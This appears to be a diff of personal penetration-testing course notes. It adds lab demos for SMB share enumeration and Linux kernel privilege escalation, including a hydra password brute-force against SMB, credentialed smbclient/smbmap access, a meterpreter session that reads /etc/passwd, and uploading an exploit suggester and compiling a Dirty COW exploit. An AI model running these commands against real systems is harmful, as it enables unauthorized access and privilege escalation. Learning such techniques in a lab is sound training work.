@@ -178,9 +178,23 @@ Exploiting SAMBA:
 - Another tool called smbclient, part of the SAMBA software suite, provides a client interface similar to FTP. It allows downloading files from the server to the local machine, uploading files from the local machine to the server, and retrieving directory information from the server
 
 Demo enumerating shares 
-
-
-
+- run nmap service scan 
+- perform bruteforce on smb 
+- hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt targetip smb 
+	- we don't use a wordlist or username because we know which account/username we want to bruteforce 
+- smbmap 
+	- enumerate shares on target system: smbmap -H targetip -u admin -p password1 
+	- access the found shares through smbclient
+		- smbclient -L ip -U admin 
+		- smbclient //ip/Sharename -U admin
+		- smbclient //ip/Sharename -U admin 
+			- get flag - exit 
+			- ls our directory 
+			- tar xzf file (to extract the content)
+- enum for linux 
+	- enum4linux -a target 
+	- enum4linux -a -u admin -p password1 target 
+	
 
 
 
@@ -208,6 +222,45 @@ Tools & Environment:
 - Linux-Exploit-Suggester: This tool helps detect security deficiencies in a given Linux kernel or Linux-based machine. It utilizes heuristics methods to assess the exposure of the kernel to publicly known Linux kernel exploits.
     - GitHub: [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
 - Note: The techniques demonstrated in this video are performed on an Ubuntu 12.04 VM.
+- be carefull with kernel exploits because it can cause kernel panic and dataloss 
+
+-- Demo -- 
+
+Set up meterpreter session:
+	- sysinfo 
+	- getuid 
+	- obtain a bash sessin: 
+		- shell 
+		- cat /etc/passwd 
+		- sudo apt-get update 
+	- obtain root privileges 
+		- download LES on kali and then transferring it over to target 
+		- in meterpreter session cd /tmp and ls 
+		- upload ~/Desktop/Linux-Enum/les.sh 
+		- shell 
+		- /bin/bash -i 
+		- chmod +x les.sh 
+		- ls - alps 
+		- ./les.sh (this will execute the script)
+verify exploit code to ensure that it is not doing anything malicious 
+
+![[Pasted image 20230712152115.png]]
+download ![[Pasted image 20230712152149.png]]
+to run C you need to install package: sudo apt-get install gcc 
+
+- navigate to the exploit file on your kali 
+- rename the file to dirty.c: mv filename dirty.c 
+- run gcc command 
+
+
+
+
+
+
+
+
+
+
 
 
 ## Exploiting Misconfigured Cron Jobs 
